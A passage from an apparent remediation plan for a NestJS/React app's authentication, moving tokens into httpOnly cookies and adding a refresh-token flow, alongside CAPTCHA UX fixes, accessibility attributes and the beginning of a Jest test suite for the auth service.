    res.cookie('accessToken', result.access_token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000,
      path: '/',
    });

    res.cookie('refreshToken', result.refresh_token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000,
      path: '/',
    });

    return {
      user: result.user,
    };
  }

  // ... other endpoints
}
```

**File 3:** Update CORS to allow credentials

Edit `/opt/sikancil/backend/src/main.ts`:

```typescript
async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  app.setGlobalPrefix('api/v1');
  app.use(helmet());
  app.use(cookieParser()); // ✅ Already present, ensure it's here

  // ✅ UPDATE CORS CONFIG
  app.enableCors({
    origin: process.env.CORS_ORIGIN?.split(',') || ['http://localhost:5173'],
    credentials: true, // ✅ CRITICAL: Allow cookies to be sent cross-origin
    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
    exposedHeaders: ['Set-Cookie'],
  });

  // ... rest of bootstrap
}
```

---

#### FRONTEND CHANGES

**File 1:** Update API client to use credentials

Edit `/opt/sikancil/frontend/src/lib/api-client.ts`:

```typescript
import axios from 'axios';

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000/api/v1';

export const apiClient = axios.create({
  baseURL: API_BASE_URL,
  timeout: 30000,
  withCredentials: true, // ✅ CRITICAL: Send cookies with requests
  headers: {
    'Content-Type': 'application/json',
  },
});

// ✅ REMOVE Authorization header interceptor
// Cookies are sent automatically by browser

// ✅ UPDATED RESPONSE INTERCEPTOR
apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // Handle 401 Unauthorized
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // ✅ Call refresh endpoint (uses refreshToken cookie)
        await axios.post(
          `${API_BASE_URL}/auth/refresh`,
          {},
          { withCredentials: true } // Send cookies
        );

        // Retry original request
        return apiClient(originalRequest);
      } catch (refreshError) {
        // Refresh failed - redirect to login
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);
```

**File 2:** Update auth store (remove token storage)

Edit `/opt/sikancil/frontend/src/stores/auth.store.ts`:

```typescript
import { create } from 'zustand';
import { persist } from 'zustand/middleware';
import type { User, FiscalYear } from '@/features/auth/types';

interface AuthState {
  user: User | null;
  isAuthenticated: boolean;
  lastActivity: number | null;

  // ✅ REMOVED: accessToken, refreshToken

  login: (user: User, fiscalYear?: FiscalYear) => void;
  logout: () => void;
  updateUser: (user: Partial<User>) => void;
  updateLastActivity: () => void;
}

export const useAuthStore = create<AuthState>()(
  persist(
    (set, get) => ({
      user: null,
      isAuthenticated: false,
      lastActivity: null,

      login: (user: User, fiscalYear?: FiscalYear) => {
        // ✅ NO TOKEN STORAGE - tokens are in httpOnly cookies
        set({
          user,
          isAuthenticated: true,
          lastActivity: Date.now(),
        });
      },

      logout: () => {
        // ✅ NO TOKEN REMOVAL - backend clears cookies
        set({
          user: null,
          isAuthenticated: false,
          lastActivity: null,
        });
      },

      updateUser: (userData: Partial<User>) => {
        const currentUser = get().user;
        if (currentUser) {
          set({ user: { ...currentUser, ...userData } });
        }
      },

      updateLastActivity: () => {
        set({ lastActivity: Date.now() });
      },
    }),
    {
      name: 'auth-storage',
      partialize: (state) => ({
        user: state.user,
        isAuthenticated: state.isAuthenticated,
        lastActivity: state.lastActivity,
        // ✅ REMOVED: accessToken, refreshToken from persistence
      }),
    }
  )
);

// ✅ Session timeout remains the same
export const initializeSessionTimeout = (callback: () => void) => {
  const TIMEOUT_DURATION = 15 * 60 * 1000; // 15 minutes

  const checkTimeout = () => {
    const { lastActivity, isAuthenticated } = useAuthStore.getState();

    if (!isAuthenticated || !lastActivity) {
      return;
    }

    const elapsed = Date.now() - lastActivity;
    if (elapsed >= TIMEOUT_DURATION) {
      callback();
    }
  };

  const intervalId = setInterval(checkTimeout, 60000); // Check every minute
  return () => clearInterval(intervalId);
};
```

**File 3:** Update auth API (add logout method)

Edit `/opt/sikancil/frontend/src/features/auth/api.ts`:

```typescript
export const authApi = {
  login: async (credentials: LoginCredentials): Promise<LoginResponse> => {
    const response = await apiClient.post<LoginResponse>('/auth/login', credentials);
    return response.data;
  },

  register: async (data: RegisterFormData): Promise<User> => {
    const response = await apiClient.post<User>('/auth/register', data);
    return response.data;
  },

  // ✅ ADD LOGOUT METHOD
  logout: async (): Promise<void> => {
    await apiClient.post('/auth/logout');
  },

  // ✅ REFRESH METHOD (uses cookie automatically)
  refreshToken: async (): Promise<void> => {
    await apiClient.post('/auth/refresh');
  },

  // ... other methods
};
```

**File 4:** Update useAuth hooks

Edit `/opt/sikancil/frontend/src/features/auth/hooks/useAuth.ts`:

```typescript
import { useMutation, useQueryClient } from '@tanstack/react-query';
import { useNavigate, useLocation } from 'react-router-dom';
import { useAuthStore } from '@/stores/auth.store';
import { authApi } from '../api';
import type { LoginCredentials } from '../types';

export const useLogin = () => {
  const { login } = useAuthStore();
  const navigate = useNavigate();
  const location = useLocation();
  const queryClient = useQueryClient();

  return useMutation({
    mutationFn: (credentials: LoginCredentials) => authApi.login(credentials),
    onSuccess: (data) => {
      // ✅ Tokens are already in cookies (set by backend)
      // Just update store with user data
      login(data.user, data.fiscalYear);

      queryClient.invalidateQueries({ queryKey: ['profile'] });

      // ✅ REDIRECT TO ORIGINAL PAGE
      const from = (location.state as any)?.from?.pathname || '/dashboard';
      navigate(from, { replace: true });
    },
    onError: (error: any) => {
      console.error('Login failed:', error);
    },
  });
};

export const useLogout = () => {
  const { logout } = useAuthStore();
  const navigate = useNavigate();
  const queryClient = useQueryClient();

  return useMutation({
    mutationFn: () => authApi.logout(), // ✅ Call backend to clear cookies
    onSettled: () => {
      // Always clear store and navigate (even on error)
      logout();
      queryClient.clear();
      navigate('/login', { replace: true });
    },
  });
};

// ... other hooks
```

**🧪 Testing:**

```bash
# Test 1: Check cookies after login
# 1. Open browser DevTools → Application → Cookies
# 2. Login
# 3. Verify cookies:
#    - accessToken (httpOnly: true, secure: true in prod, sameSite: strict)
#    - refreshToken (httpOnly: true, secure: true in prod, sameSite: strict)

# Test 2: Verify tokens NOT in localStorage
# 1. DevTools → Application → Local Storage
# 2. Check auth-storage key
# 3. Should NOT contain accessToken or refreshToken

# Test 3: XSS attempt
# 1. Open DevTools Console
# 2. Try: document.cookie
# 3. Should NOT show accessToken or refreshToken (httpOnly protection)
# 4. Try: localStorage.getItem('accessToken')
# 5. Should return null

# Test 4: API requests include cookies
# 1. DevTools → Network tab
# 2. Make authenticated request (e.g., GET /users)
# 3. Check Request Headers
# 4. Should see: Cookie: accessToken=...; refreshToken=...
# 5. Should NOT see: Authorization: Bearer ...

# Test 5: Logout clears cookies
# 1. Login (verify cookies present)
# 2. Logout
# 3. Check cookies
# 4. accessToken and refreshToken should be gone

# Test 6: Refresh token flow
# 1. Login
# 2. Wait for access token to expire (or manually delete it from cookies)
# 3. Make authenticated request
# 4. Should auto-refresh and retry request
# 5. No redirect to login

# Test 7: Cross-origin requests (if frontend/backend on different domains)
# 1. Ensure CORS_ORIGIN includes frontend domain
# 2. Login
# 3. Cookies should be sent with cross-origin requests
```

**✅ Success Criteria:**
- [ ] Tokens stored in httpOnly cookies
- [ ] No tokens in localStorage or sessionStorage
- [ ] Cookies sent automatically with requests
- [ ] XSS cannot access tokens
- [ ] Logout clears cookies
- [ ] Refresh token flow works
- [ ] Cross-origin requests work (if applicable)

---

### 3.2 Implement Refresh Token Flow

**User Decision:** Implement now ✅

**📁 Files:**
- Backend:
  - `/opt/sikancil/backend/src/modules/auth/entities/refresh-token.entity.ts` (create new)
  - `/opt/sikancil/backend/src/modules/auth/auth.module.ts`
  - `/opt/sikancil/backend/src/modules/auth/auth.service.ts`
  - `/opt/sikancil/backend/src/modules/auth/auth.controller.ts`
- Frontend:
  - Already handled in 3.1 (api-client.ts interceptor)

**✅ Solusi:**

**Step 1:** Create RefreshToken entity

Buat file: `/opt/sikancil/backend/src/modules/auth/entities/refresh-token.entity.ts`

```typescript
import {
  Entity,
  PrimaryGeneratedColumn,
  Column,
  CreateDateColumn,
  ManyToOne,
  JoinColumn,
  Index,
} from 'typeorm';
import { User } from '../../users/entities/user.entity';

@Entity('refresh_tokens')
export class RefreshToken {
  @PrimaryGeneratedColumn('uuid')
  id: string;

  @Column({ length: 500 })
  @Index()
  token: string;

  @Column()
  @Index()
  userId: string;

  @ManyToOne(() => User, { onDelete: 'CASCADE' })
  @JoinColumn({ name: 'userId' })
  user: User;

  @Column()
  expiresAt: Date;

  @CreateDateColumn()
  createdAt: Date;

  @Column({ default: false })
  revoked: boolean;

  @Column({ type: 'varchar', length: 45, nullable: true })
  ipAddress?: string;

  @Column({ type: 'varchar', length: 255, nullable: true })
  userAgent?: string;
}
```

**Step 2:** Add TypeORM entity to AuthModule

Edit `/opt/sikancil/backend/src/modules/auth/auth.module.ts`:

```typescript
import { TypeOrmModule } from '@nestjs/typeorm';
import { RefreshToken } from './entities/refresh-token.entity';

@Module({
  imports: [
    TypeOrmModule.forFeature([RefreshToken]), // ✅ ADD THIS
    UsersModule,
    FiscalYearModule,
    PassportModule.register({ defaultStrategy: 'jwt' }),
    JwtModule.registerAsync({
      imports: [ConfigModule],
      useFactory: getJwtConfig,
      inject: [ConfigService],
    }),
  ],
  providers: [AuthService, JwtStrategy, CaptchaService],
  controllers: [AuthController],
  exports: [AuthService, JwtStrategy, PassportModule, CaptchaService],
})
export class AuthModule {}
```

**Step 3:** Update AuthService with refresh token logic

Edit `/opt/sikancil/backend/src/modules/auth/auth.service.ts`:

```typescript
import { Injectable, UnauthorizedException } from '@nestjs/common';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import { JwtService } from '@nestjs/jwt';
import { UsersService } from '../users/users.service';
import { FiscalYearService } from '../fiscal-year/fiscal-year.service';
import { RefreshToken } from './entities/refresh-token.entity';
import { randomBytes } from 'crypto';
import * as bcrypt from 'bcrypt';

@Injectable()
export class AuthService {
  constructor(
    @InjectRepository(RefreshToken)
    private refreshTokenRepository: Repository<RefreshToken>,
    private usersService: UsersService,
    private fiscalYearService: FiscalYearService,
    private jwtService: JwtService,
  ) {}

  async login(loginDto: LoginDto) {
    const user = await this.validateUser(loginDto.username, loginDto.password);

    if (!user) {
      throw new UnauthorizedException('Username atau password salah');
    }

    // Determine fiscal year
    let fiscalYear;
    if (loginDto.fiscalYearId) {
      fiscalYear = await this.fiscalYearService.findOne(loginDto.fiscalYearId);
    } else if (user.activeFiscalYearId) {
      fiscalYear = await this.fiscalYearService.findOne(user.activeFiscalYearId);
    } else {
      fiscalYear = await this.fiscalYearService.getActiveFiscalYear();
    }

    // Update user preferences
    await this.usersService.updateActiveFiscalYear(user.id, fiscalYear.id);
    await this.usersService.updateLastLogin(user.id);

    // ✅ GENERATE TOKENS
    const accessToken = this.generateAccessToken(user, fiscalYear);
    const refreshToken = await this.generateRefreshToken(user);

    return {
      user,
      access_token: accessToken,
      refresh_token: refreshToken,
      fiscalYear,
    };
  }

  async register(registerDto: RegisterDto) {
    const user = await this.usersService.create(registerDto, null);
    const fiscalYear = await this.fiscalYearService.getActiveFiscalYear();

    const accessToken = this.generateAccessToken(user, fiscalYear);
    const refreshToken = await this.generateRefreshToken(user);

    return {
      user,
      access_token: accessToken,
      refresh_token: refreshToken,
    };
  }

  /**
   * Generate JWT access token
   * Short-lived (15 minutes)
   */
  private generateAccessToken(user: User, fiscalYear: FiscalYear): string {
    const payload = {
      sub: user.id,
      username: user.username,
      email: user.email,
      role: user.role,
      fiscalYearId: fiscalYear.id,
      fiscalYear: fiscalYear.tahun,
    };

    return this.jwtService.sign(payload);
  }

  /**
   * Generate refresh token
   * Long-lived (7 days), stored in database
   */
  private async generateRefreshToken(
    user: User,
    ipAddress?: string,
    userAgent?: string,
  ): Promise<string> {
    const token = randomBytes(64).toString('hex');
    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + 7); // 7 days

    await this.refreshTokenRepository.save({
      token,
      userId: user.id,
      expiresAt,
      ipAddress,
      userAgent,
    });

    return token;
  }

  /**
   * Refresh access token using refresh token
   */
  async refreshAccessToken(refreshToken: string) {
    const tokenRecord = await this.refreshTokenRepository.findOne({
      where: { token: refreshToken, revoked: false },
      relations: ['user'],
    });

    if (!tokenRecord) {
      throw new UnauthorizedException('Invalid refresh token');
    }

    if (new Date() > tokenRecord.expiresAt) {
      throw new UnauthorizedException('Refresh token expired');
    }

    if (tokenRecord.user.status !== 'active') {
      throw new UnauthorizedException('User account is not active');
    }

    // Get user's fiscal year
    const fiscalYear = tokenRecord.user.activeFiscalYearId
      ? await this.fiscalYearService.findOne(tokenRecord.user.activeFiscalYearId)
      : await this.fiscalYearService.getActiveFiscalYear();

    // Generate new access token
    const accessToken = this.generateAccessToken(tokenRecord.user, fiscalYear);

    return {
      access_token: accessToken,
      user: tokenRecord.user,
      fiscalYear,
    };
  }

  /**
   * Revoke a specific refresh token
   */
  async revokeRefreshToken(token: string): Promise<void> {
    await this.refreshTokenRepository.update(
      { token },
      { revoked: true }
    );
  }

  /**
   * Revoke all refresh tokens for a user
   * Used when user changes password or on security events
   */
  async revokeAllUserTokens(userId: string): Promise<void> {
    await this.refreshTokenRepository.update(
      { userId, revoked: false },
      { revoked: true }
    );
  }

  /**
   * Clean up expired refresh tokens
   * Should be run periodically (cron job)
   */
  async cleanExpiredTokens(): Promise<void> {
    await this.refreshTokenRepository
      .createQueryBuilder()
      .delete()
      .where('expiresAt < :now', { now: new Date() })
      .execute();
  }

  // ... existing validateUser method (updated in 2.5)
}
```

**Step 4:** Add refresh endpoint

Edit `/opt/sikancil/backend/src/modules/auth/auth.controller.ts`:

```typescript
import { Request } from 'express';

@Controller('auth')
export class AuthController {
  // ... existing methods

  @Post('refresh')
  @Throttle({ default: { limit: 20, ttl: 60000 } }) // 20 per minute
  @HttpCode(HttpStatus.OK)
  async refresh(
    @Req() req: Request,
    @Res({ passthrough: true }) res: Response,
  ) {
    const refreshToken = req.cookies?.refreshToken;

    if (!refreshToken) {
      throw new UnauthorizedException('No refresh token provided');
    }

    const result = await this.authService.refreshAccessToken(refreshToken);

    // ✅ SET NEW ACCESS TOKEN COOKIE
    res.cookie('accessToken', result.access_token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000, // 15 minutes
      path: '/',
    });

    return {
      message: 'Token refreshed successfully',
      user: result.user,
      fiscalYear: result.fiscalYear,
    };
  }

  @Post('logout')
  @HttpCode(HttpStatus.OK)
  async logout(
    @Req() req: Request,
    @Res({ passthrough: true }) res: Response,
  ) {
    const refreshToken = req.cookies?.refreshToken;

    if (refreshToken) {
      // ✅ REVOKE REFRESH TOKEN
      await this.authService.revokeRefreshToken(refreshToken);
    }

    res.clearCookie('accessToken');
    res.clearCookie('refreshToken');

    return { message: 'Logged out successfully' };
  }
}
```

**Step 5:** Create database migration

```bash
cd backend

# Generate migration
pnpm run migration:generate -- src/migrations/CreateRefreshTokenTable

# Run migration
pnpm run migration:run
```

**Step 6:** (Optional) Add cron job to clean expired tokens

Install @nestjs/schedule if not already:

```bash
cd backend
pnpm add @nestjs/schedule
```

Create file: `/opt/sikancil/backend/src/modules/auth/auth.scheduler.ts`

```typescript
import { Injectable } from '@nestjs/common';
import { Cron, CronExpression } from '@nestjs/schedule';
import { AuthService } from './auth.service';

@Injectable()
export class AuthScheduler {
  constructor(private authService: AuthService) {}

  @Cron(CronExpression.EVERY_DAY_AT_MIDNIGHT)
  async handleCleanExpiredTokens() {
    console.log('Cleaning expired refresh tokens...');
    await this.authService.cleanExpiredTokens();
    console.log('Expired refresh tokens cleaned');
  }
}
```

Add to auth.module.ts:

```typescript
import { ScheduleModule } from '@nestjs/schedule';
import { AuthScheduler } from './auth.scheduler';

@Module({
  imports: [
    ScheduleModule.forRoot(), // Add in app.module.ts instead if global
    // ... other imports
  ],
  providers: [AuthService, JwtStrategy, CaptchaService, AuthScheduler],
  // ...
})
```

**🧪 Testing:**

```bash
# Test 1: Login creates refresh token in DB
# 1. Login
# 2. Check database:
SELECT * FROM refresh_tokens ORDER BY "createdAt" DESC LIMIT 5;
# Should see new token with expiresAt = now + 7 days

# Test 2: Access token expires, auto-refresh works
# 1. Login
# 2. In DevTools, delete accessToken cookie
# 3. Make authenticated request
# 4. Network tab should show:
#    - Original request fails with 401
#    - POST /auth/refresh succeeds
#    - Original request retries and succeeds
# 5. New accessToken cookie should be set

# Test 3: Refresh token expiry
# 1. Manually set expiresAt to past in database
UPDATE refresh_tokens SET "expiresAt" = NOW() - INTERVAL '1 day' WHERE token = '...';
# 2. Try to refresh
# Expected: 401 "Refresh token expired"

# Test 4: Logout revokes refresh token
# 1. Login (creates token)
# 2. Check DB - revoked = false
# 3. Logout
# 4. Check DB - revoked = true
# 5. Try to use revoked token for refresh
# Expected: 401 "Invalid refresh token"

# Test 5: Concurrent sessions
# 1. Login on Browser A
# 2. Login on Browser B (same user)
# 3. Check DB - should have 2 active refresh tokens
# 4. Logout on Browser A
# 5. Browser B should still work (separate session)

# Test 6: Revoke all user tokens
# In backend code or Swagger:
await authService.revokeAllUserTokens(userId);
# All user's sessions should be invalidated
```

**✅ Success Criteria:**
- [ ] Login generates refresh token stored in DB
- [ ] Refresh endpoint exchanges refresh token for new access token
- [ ] Expired refresh tokens rejected
- [ ] Logout revokes refresh token
- [ ] Multiple concurrent sessions supported
- [ ] Expired tokens cleaned up (cron job)

---

## FASE 4: UX IMPROVEMENTS
**Estimasi: 2-3 jam | Prioritas: MEDIUM**

### 4.1 Auto-Refresh CAPTCHA After Failed Login

**📁 File:** `/opt/sikancil/frontend/src/features/auth/components/LoginForm.tsx`

**✅ Solusi:**

```typescript
// Update useLogin hook usage (around line 75)
const loginMutation = useLogin({
  onError: (error) => {
    // ✅ Auto-refresh CAPTCHA on login failure
    fetchCaptcha();
  },
});
```

Or alternatively, update in useAuth.ts hook:

```typescript
// useAuth.ts
export const useLogin = (options?: { onError?: (error: any) => void }) => {
  const { login } = useAuthStore();
  const navigate = useNavigate();
  const location = useLocation();

  return useMutation({
    mutationFn: (credentials: LoginCredentials) => authApi.login(credentials),
    onSuccess: (data) => {
      login(data.user, data.fiscalYear);
      const from = (location.state as any)?.from?.pathname || '/dashboard';
      navigate(from, { replace: true });
    },
    onError: (error: any) => {
      console.error('Login failed:', error);
      options?.onError?.(error); // Allow caller to handle error
    },
  });
};
```

**🧪 Testing:**
- Enter wrong password
- Submit form
- CAPTCHA should automatically refresh with new image

**✅ Success Criteria:**
- [ ] CAPTCHA refreshes on failed login
- [ ] User doesn't need to manually click refresh

---

### 4.2 Replace Native Select with Design System Component

**📁 File:** `/opt/sikancil/frontend/src/features/auth/components/LoginForm.tsx`

**✅ Solusi:**

```typescript
import { Controller } from 'react-hook-form';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select';

// Replace native select (around line 145-163)
<div className="space-y-2">
  <Label htmlFor="fiscalYearId">Tahun Anggaran</Label>
  <Controller
    name="fiscalYearId"
    control={control}
    render={({ field }) => (
      <Select
        value={field.value || ''}
        onValueChange={field.onChange}
        disabled={isLoadingFiscalYears}
      >
        <SelectTrigger
          className={errors.fiscalYearId ? 'border-destructive' : ''}
        >
          <SelectValue placeholder="Pilih Tahun Anggaran" />
        </SelectTrigger>
        <SelectContent>
          {isLoadingFiscalYears ? (
            <SelectItem value="" disabled>
              Memuat tahun anggaran...
            </SelectItem>
          ) : fiscalYears.length === 0 ? (
            <SelectItem value="" disabled>
              Tidak ada tahun anggaran
            </SelectItem>
          ) : (
            fiscalYears.map((fy) => (
              <SelectItem key={fy.id} value={fy.id}>
                {fy.tahun} {fy.isCurrent ? '(Tahun Berjalan)' : ''}
              </SelectItem>
            ))
          )}
        </SelectContent>
      </Select>
    )}
  />
  {errors.fiscalYearId && (
    <p className="text-sm text-destructive" role="alert">
      {errors.fiscalYearId.message}
    </p>
  )}
  <p className="text-xs text-muted-foreground">
    Tahun anggaran yang akan digunakan saat login
  </p>
</div>
```

**🧪 Testing:**
- Visual consistency with other form controls
- Dropdown works on all browsers
- Keyboard navigation works
- Error state displays correctly

**✅ Success Criteria:**
- [ ] Select component matches design system
- [ ] Consistent styling across browsers
- [ ] Keyboard accessible

---

## FASE 5: ACCESSIBILITY IMPROVEMENTS
**Estimasi: 2-3 jam | Prioritas: LOW-MEDIUM**

### 5.1 Add Accessibility Labels & ARIA Attributes

**📁 File:** `/opt/sikancil/frontend/src/features/auth/components/LoginForm.tsx`

**✅ Comprehensive Fix:**

```typescript
{/* Password Field with Toggle */}
<div className="space-y-2">
  <Label htmlFor="password">Password</Label>
  <div className="relative">
    <Input
      {...register('password')}
      type={showPassword ? 'text' : 'password'}
      id="password"
      placeholder="Masukkan password"
      error={!!errors.password}
      autoComplete="current-password"
      aria-invalid={!!errors.password}
      aria-describedby={errors.password ? 'password-error' : undefined}
    />
    <button
      type="button"
      onClick={() => setShowPassword(!showPassword)}
      aria-label={showPassword ? 'Sembunyikan password' : 'Tampilkan password'} // ✅ ADD
      aria-pressed={showPassword} // ✅ ADD
      className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground focus:outline-none focus:ring-2 focus:ring-primary rounded"
    >
      {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
    </button>
  </div>
  {errors.password && (
    <p id="password-error" className="text-sm text-destructive" role="alert"> // ✅ ADD ID
      {errors.password.message}
    </p>
  )}
</div>

{/* CAPTCHA Section */}
<div className="space-y-2">
  <Label htmlFor="captcha">Verifikasi CAPTCHA</Label> // ✅ FIXED htmlFor
  <div className="flex items-start gap-2">
    {/* CAPTCHA Image - Keyboard accessible */}
    <div
      className="flex-shrink-0 border rounded bg-muted p-2 cursor-pointer focus:outline-none focus:ring-2 focus:ring-primary"
      onClick={fetchCaptcha}
      onKeyDown={(e) => { // ✅ ADD keyboard support
        if (e.key === 'Enter' || e.key === ' ') {
          e.preventDefault();
          fetchCaptcha();
        }
      }}
      role="button" // ✅ ADD
      tabIndex={0} // ✅ ADD
      aria-label="Klik untuk refresh CAPTCHA" // ✅ ADD
      title="Klik untuk refresh CAPTCHA"
    >
      {/* ... CAPTCHA display ... */}
    </div>

    {/* Refresh Button */}
    <button
      type="button"
      onClick={fetchCaptcha}
      disabled={isLoadingCaptcha}
      aria-label="Refresh kode CAPTCHA" // ✅ ADD
      aria-busy={isLoadingCaptcha} // ✅ ADD
      className="p-2 hover:bg-muted rounded-md transition-colors focus:outline-none focus:ring-2 focus:ring-primary"
    >
      <RefreshCw
        size={20}
        className={isLoadingCaptcha ? 'animate-spin' : ''}
        aria-hidden="true" // ✅ ADD - icon is decorative
      />
    </button>
  </div>

  {/* CAPTCHA Input */}
  <Input
    {...register('captcha')}
    type="text"
    id="captcha"
    autoComplete="off"
    placeholder="Masukkan kode CAPTCHA"
    error={!!errors.captcha}
    aria-invalid={!!errors.captcha}
    aria-describedby="captcha-help captcha-error" // ✅ ADD
    aria-required="true" // ✅ ADD
  />
  {errors.captcha && (
    <p id="captcha-error" className="mt-1 text-sm text-destructive" role="alert">
      {errors.captcha.message}
    </p>
  )}
  <p id="captcha-help" className="text-xs text-muted-foreground">
    Masukkan karakter yang terlihat pada gambar di atas
  </p>
</div>

{/* Submit Button */}
<Button
  type="submit"
  className="w-full"
  disabled={loginMutation.isPending}
  isLoading={loginMutation.isPending}
  aria-busy={loginMutation.isPending} // ✅ ADD
>
  <span className="sr-only">
    {loginMutation.isPending ? 'Sedang masuk...' : 'Masuk'}
  </span>
  <span aria-hidden="true">
    {loginMutation.isPending ? 'Memproses...' : 'Masuk'}
  </span>
</Button>
```

**🧪 Testing dengan Screen Reader:**

```bash
# Test dengan NVDA (Windows) atau VoiceOver (Mac)

# 1. Tab navigation
# - Tab through all form fields
# - Each field should announce label
# - Error fields should announce "invalid"
# - Helper text should be read after field

# 2. Password toggle
# - Tab to password field, enter text
# - Tab to eye icon button
# - Should announce "Tampilkan password" or "Sembunyikan password"
# - Press Enter - should toggle visibility
# - Should announce new state

# 3. CAPTCHA
# - Tab to CAPTCHA image
# - Should announce "Klik untuk refresh CAPTCHA"
# - Press Enter - should fetch new CAPTCHA
# - Tab to refresh button
# - Should announce "Refresh kode CAPTCHA"
# - Tab to CAPTCHA input
# - Should read helper text
# - Enter wrong CAPTCHA, submit
# - Should announce error message

# 4. Form submission
# - Fill all fields
# - Tab to submit button
# - Should announce "Masuk"
# - Press Enter
# - Should announce "Sedang masuk..." (aria-busy)
```

**✅ Success Criteria:**
- [ ] All interactive elements have labels
- [ ] Error messages have role="alert"
- [ ] Helper text connected via aria-describedby
- [ ] Keyboard navigation works for all elements
- [ ] Screen reader announces all states

---

## FASE 6: TESTING & VERIFICATION
**Estimasi: 6-8 jam | Prioritas: MEDIUM**

### 6.1 Comprehensive Backend Tests

**📁 File:** `/opt/sikancil/backend/src/modules/auth/auth.service.spec.ts`

**✅ Complete Test Suite:**

```typescript
import { Test, TestingModule } from '@nestjs/testing';
import { AuthService } from './auth.service';
import { JwtService } from '@nestjs/jwt';
import { UsersService } from '../users/users.service';
import { FiscalYearService } from '../fiscal-year/fiscal-year.service';
import { Repository } from 'typeorm';
import { RefreshToken } from './entities/refresh-token.entity';
import { getRepositoryToken } from '@nestjs/typeorm';
import { UnauthorizedException } from '@nestjs/common';
import * as bcrypt from 'bcrypt';

// Mock bcrypt
jest.mock('bcrypt');

describe('AuthService', () => {
  let service: AuthService;
  let usersService: jest.Mocked<UsersService>;
  let jwtService: jest.Mocked<JwtService>;
  let fiscalYearService: jest.Mocked<FiscalYearService>;
  let refreshTokenRepository: jest.Mocked<Repository<RefreshToken>>;

  const mockUser = {
    id: 'user-123',
    username: 'testuser',
    email: 'test@example.com',
    password: '$2b$10$hashedpassword',
    fullName: 'Test User',
    role: 'user',
    status: 'active',
    activeFiscalYearId: 'fy-123',
  };

  const mockFiscalYear = {
    id: 'fy-123',
    tahun: 2026,
    isCurrent: true,
    status: 'OPEN',
  };

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        AuthService,
        {
          provide: JwtService,
          useValue: {
            sign: jest.fn().mockReturnValue('mock-jwt-token'),
          },
        },
        {
          provide: UsersService,
          useValue: {
            findByUsername: jest.fn(),
            updateActiveFiscalYear: jest.fn(),
            updateLastLogin: jest.fn(),
            create: jest.fn(),
            findOne: jest.fn(),
          },
        },
        {
          provide: FiscalYearService,
          useValue: {
            findOne: jest.fn(),
            getActiveFiscalYear: jest.fn(),
          },
        },
        {
          provide: getRepositoryToken(RefreshToken),
          useValue: {
            save: jest.fn(),
            findOne: jest.fn(),
            update: jest.fn(),
            createQueryBuilder: jest.fn(),
          },
        },
      ],
    }).compile();

    service = module.get<AuthService>(AuthService);
    usersService = module.get(UsersService);
    jwtService = module.get(JwtService);
    fiscalYearService = module.get(FiscalYearService);
    refreshTokenRepository = module.get(getRepositoryToken(RefreshToken));

    // Reset mocks
    jest.clearAllMocks();
  });

  it('should be defined', () => {
    expect(service).toBeDefined();
  });

  describe('validateUser', () => {
    it('should return user if credentials are valid', async () => {
      usersService.findByUsername.mockResolvedValue(mockUser as any);
      (bcrypt.compare as jest.Mock).mockResolvedValue(true);

      const result = await service.validateUser('testuser', 'password123');

      expect(result).toEqual(mockUser);
      expect(usersService.findByUsername).toHaveBeenCalledWith('testuser');
      expect(bcrypt.compare).toHaveBeenCalledWith('password123', mockUser.password);
    });

    it('should return null if user not found', async () => {
      usersService.findByUsername.mockResolvedValue(null);
      (bcrypt.compare as jest.Mock).mockResolvedValue(true);

      const result = await service.validateUser('nonexistent', 'password123');

      expect(result).toBeNull();
      // Should still run bcrypt for timing attack prevention
      expect(bcrypt.compare).toHaveBeenCalled();
    });

    it('should return null if password is incorrect', async () => {
      usersService.findByUsername.mockResolvedValue(mockUser as any);
      (bcrypt.compare as jest.Mock).mockResolvedValue(false);

      const result = await service.validateUser('testuser', 'wrongpassword');

      expect(result).toBeNull();
    });

    it('should return null if user is inactive', async () => {
      const inactiveUser = { ...mockUser, status: 'inactive' };
      usersService.findByUsername.mockResolvedValue(inactiveUser as any);
      (bcrypt.compare as jest.Mock).mockResolvedValue(true);

      const result = await service.validateUser('testuser', 'password123');

      expect(result).toBeNull();
    });
  });

  describe('login', () => {
    it('should login successfully with valid credentials', async () => {
      usersService.findByUsername.mockResolvedValue(mockUser as any);
      (bcrypt.compare as jest.Mock).mockResolvedValue(true);
      fiscalYearService.findOne.mockResolvedValue(mockFiscalYear as any);
      usersService.updateActiveFiscalYear.mockResolvedValue(undefined);
      usersService.updateLastLogin.mockResolvedValue(undefined);
      refreshTokenRepository.save.mockResolvedValue({ token: 'refresh-token' } as any);

      const result = await service.login({
        username: 'testuser',
        password: 'password123',
        fiscalYearId: 'fy-123',
        captchaId: 'cap-123',
        captcha: 'ABCD',
      });

      expect(result).toHaveProperty('user');
      expect(result).toHaveProperty('access_token');
      expect(result).toHaveProperty('refresh_token');
      expect(result).toHaveProperty('fiscalYear');
      expect(jwtService.sign).toHaveBeenCalled();
      expect(refreshTokenRepository.save).toHaveBeenCalled();
    });

    it('should throw UnauthorizedException if credentials invalid', async () => {
      usersService.findByUsername.mockResolvedValue(mockUser as any);
      (bcrypt.compare as jest.Mock).mockResolvedValue(false);

      await expect(
        service.login({
          username: 'testuser',
          password: 'wrongpassword',
          captchaId: 'cap-123',
          captcha: 'ABCD',
        })
